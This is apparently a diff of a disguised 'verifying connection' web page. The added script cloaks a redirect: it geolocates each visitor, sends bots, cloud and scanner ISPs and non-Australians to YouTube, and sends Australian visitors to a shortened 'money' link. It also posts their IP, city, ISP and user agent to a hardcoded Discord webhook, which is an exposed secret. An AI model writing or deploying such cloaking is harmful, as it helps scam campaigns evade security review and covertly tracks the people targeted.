@@ -3,53 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
+    <meta name="robots" content="noindex, nofollow">
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        body { font-family: sans-serif; background-color: #ffffff; color: #333; text-align: center; padding-top: 10%; }
     </style>
 </head>
 <body>
-    <p>Loading content...</p>
+    <p>Please wait, verifying connection...</p>
 
     <script>
-        // --- CONFIGURATION ---
+        // ==========================================
+        // CONFIGURATION SECTION
+        // ==========================================
+        
+        // 1. Your Discord Webhook (Only receives CLEAN AU traffic now)
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1441937602176614451/8tYzx6G4e41dzrL-86s1f5XTl4rgOhmHk5XqsfwAPr1Iu1NZiUlDjH_etjGwzVjuZvnR"; 
-        const TARGET_URL = "https://youtube.com"; 
-        // ---------------------
 
-        async function logAndRedirect() {
+        // 2. The "Money" Link (For Clean AU Humans)
+        const AU_PAGE = "https://t.co/D9Z9ZE0";
+
+        // 3. The Safe Link (For Bots, Proxies, and other Countries)
+        const SAFE_PAGE = "https://www.youtube.com"; 
+
+        // 4. BLOCKED ISPs (Case insensitive partial match)
+        const BLOCKED_ISPS = [
+            "IP Volume inc",
+            "Alex Largman",
+            "AMAZON-AES",
+            "GOOGLE-CLOUD-PLATFORM"
+        ];
+
+        // ==========================================
+        // LOGIC START
+        // ==========================================
+
+        async function processVisitor() {
+            let destination = SAFE_PAGE; // Default to Safe Page
+            
             try {
-                // 1. Get IP and ISP data
+                // 1. Fetch IP Data
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
 
-                // 2. Gather Browser Data
-                const logData = {
-                    username: "Visitor Log",
-                    content: `**New Visitor!**\n` +
-                             `**IP:** ${data.ip}\n` +
-                             `**ISP:** ${data.org}\n` +
-                             `**Country:** ${data.country_name}\n` +
-                             `**User Agent:** ${navigator.userAgent}\n` +
-                             `**Referrer:** ${document.referrer || "Direct"}`
-                };
+                // 2. Normalize Data
+                const visitorISP = (data.org || "").toLowerCase();
+                const visitorCountry = (data.country_code || "").toUpperCase();
 
-                // 3. Send to Discord
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(logData)
-                });
+                // 3. Check if ISP is on the Block List
+                const isBot = BLOCKED_ISPS.some(blockedName => 
+                    visitorISP.includes(blockedName.toLowerCase())
+                );
+
+                // 4. MAIN LOGIC: Only AU + Not Bot gets the offer
+                if (visitorCountry === "AU" && !isBot) {
+                    
+                    // A. Set Destination to Money Page
+                    destination = AU_PAGE;
+
+                    // B. Send Discord Notification (ONLY for this group)
+                    const logData = {
+                        username: "AU Lead Detected",
+                        embeds: [{
+                            title: "💰 New Clean AU Visitor",
+                            color: 3066993, // Green
+                            fields: [
+                                { name: "IP", value: data.ip, inline: true },
+                                { name: "City", value: data.city, inline: true },
+                                { name: "ISP", value: data.org, inline: false },
+                                { name: "User Agent", value: navigator.userAgent, inline: false }
+                            ]
+                        }]
+                    };
+
+                    // Send the log (We don't await this so redirect is faster)
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(logData)
+                    });
+                }
+                // ELSE: Logic falls through to default SAFE_PAGE with NO logging.
 
             } catch (error) {
-                console.error("Logging failed", error);
+                // If API fails, just go to safe page silently
+                console.error("Check failed, defaulting to safe page");
             } finally {
-                // 4. Redirect (Even if logging fails, we MUST redirect)
-                window.location.href = TARGET_URL;
+                // 5. Execute Redirect
+                window.location.href = destination;
             }
         }
 
-        // Execute
-        logAndRedirect();
+        processVisitor();
     </script>
 </body>
 </html>
